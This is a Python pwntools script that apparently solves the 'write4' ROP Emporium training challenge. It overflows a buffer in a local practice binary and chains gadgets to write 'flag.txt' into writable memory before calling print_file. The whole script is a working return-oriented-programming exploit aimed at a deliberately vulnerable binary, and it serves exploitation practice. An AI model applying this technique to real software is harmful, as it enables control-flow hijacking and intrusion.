from pwn import *
import sys 

p = process("./write4")
p.recvuntil(b"> ")
elf = ELF("./write4", checksec=False)

# we have to call print file function with one argument -> pointer to the name of the file

what = b"flag.txt" # 8 bytes.. 
# both .data and .bss are writable but .bss has zero in size, instead .data has size 0x10, which is enough for our string 
where = 0x0601028

print_file = elf.plt["print_file"]
pop_rdi = 0x0000000000400693        #: pop rdi; ret;
pop_r14_r15 = 0x0000000000400690    #: pop r14; pop r15; ret; 
useful_gadget = 0x400628            #: mov %r15,(%r14)
pwnme_ret_address = 0x400610

offset = 0x20 + 8

payload = b"A"*offset
payload += p64(pop_r14_r15)
payload += p64(where)
payload += what
payload += p64(useful_gadget)
payload += p64(pop_rdi)
payload += p64(where)
payload += p64(print_file)
payload += p64(pwnme_ret_address)

p.send(payload)

print(p.recvline().decode() + p.recvline().decode())